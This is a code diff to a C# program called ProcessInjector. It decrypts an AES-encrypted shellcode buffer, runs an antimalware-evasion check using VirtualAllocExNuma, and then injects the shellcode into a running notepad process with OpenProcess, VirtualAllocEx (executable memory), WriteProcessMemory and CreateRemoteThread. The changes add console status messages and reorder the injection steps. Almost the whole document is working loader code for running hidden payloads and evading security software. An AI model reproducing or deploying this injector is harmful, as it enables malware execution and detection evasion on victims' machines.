@@ -56,10 +56,7 @@ namespace ProcessInjector
 
         static void Main(string[] args)
         {
-            Process[] process = Process.GetProcessesByName("notepad");
-            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process[0].Id);
-            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
-
+            // Antimalware evasion stuff
             IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
             if (mem == null)
             {
@@ -73,7 +70,7 @@ namespace ProcessInjector
             {
                 return;
             }
-
+            //
 
             byte[] key = new byte[32] {
                     0xf0,0x59,0xed,0x11,0xe7,0x8d,0x7a,0xaf,0xf6,0xe9,0xb4,0x57,
@@ -155,6 +152,7 @@ namespace ProcessInjector
                     0x9e,0x0f,0x23,0xac,0x27,0x2a,0xf4,0x5d,
             };
 
+
             string decrypted = DecryptStringFromBytes(buf, key);
 
             string[] decryptedArray = decrypted.Split('-');
@@ -164,10 +162,45 @@ namespace ProcessInjector
             {
                 shellcode[i] = Convert.ToByte(decryptedArray[i], 16);
             }
+            
+            Console.WriteLine($"[+] Payload decrypted.");
+
+            string ProcessID = "notepad";
+            Process[] process = Process.GetProcessesByName(ProcessID);
+
+            if (process.Length == 0)
+            {
+                Console.WriteLine($"[X] No PID found for process {ProcessID}.");
+                return;
+            }
+            else
+            {
+                Console.WriteLine($"[+] PID {process[0].Id} found for process {ProcessID}.");
+            }
+
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process[0].Id);
+
+            Console.WriteLine($"[+] Got handler for PID {process[0].Id}: 0x{(long)hProcess:X}");
+
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)shellcode.Length, 0x3000, 0x40);
+
+            Console.WriteLine($"[+] Allocated memory in address: 0x{(long)addr:X}");
 
             IntPtr outSize;
-            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
+            bool success = WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
+
+            if (success)
+            {
+                Console.WriteLine($"[+] Shellcode has been copied to allocated memory.");
+            }
+            else
+            {
+                Console.WriteLine($"[X] Shellcode could not be copied to allocated memory.");
+                return;
+            }
+
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            Console.WriteLine($"[+] Running new thread in process 0x{(long)hProcess:X}, starting in address 0x{(long)addr:X}. Handler: 0x{(long)hThread:X}");
         }
     }
 }
